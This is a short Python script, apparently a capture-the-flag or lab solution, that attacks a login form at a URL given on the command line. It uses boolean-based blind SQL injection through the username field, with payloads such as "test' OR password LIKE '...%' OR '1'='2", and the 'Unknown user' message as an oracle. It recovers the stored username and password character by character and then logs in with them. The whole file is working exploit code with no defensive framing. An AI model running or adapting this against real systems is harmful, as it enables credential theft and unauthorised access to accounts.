import sys
import requests
from string import ascii_lowercase, ascii_uppercase

def login(username, password):
    r = requests.post(sys.argv[1] + '\login', data={'username': username, 'password': password})
    return r.text

def is_valid_user(username, password=''):
    page = login(username, password)
    return 'Unknown user' not in page

def get_param_length(max_length, param):
    attack = "test' OR LENGTH(" + param + ") = {0} OR '1'='2"
    for i in range(1, max_length + 1):
        if is_valid_user(attack.format(i)):
            return i
    return -1

def get_value(param, max_length):
    attack = "test' OR " + param + " LIKE '{0}%' OR '1'='2"
    final_attack = "test' OR " + param + " LIKE '{0}' OR '1'='2"
    username = ""
    for _ in range(0, max_length):
        found = False
        for letter in ascii_lowercase:
            if found:
                break
            s = username + letter
            if is_valid_user(attack.format(s)):
                username += letter
                found = True
        for letter in ascii_uppercase:
            if found:
                break
            s = username + letter
            if is_valid_user(attack.format(s)):
                username += letter
                found = True
        for letter in range(0, 10):
            if found:
                break
            s = username + str(letter)
            if is_valid_user(attack.format(s)):
                username += str(letter)
                found = True
        if is_valid_user(final_attack.format(s)):
            return username
    return ''

username = get_value('username', 32)
password = get_value('password', 32)
print(login(username, password))
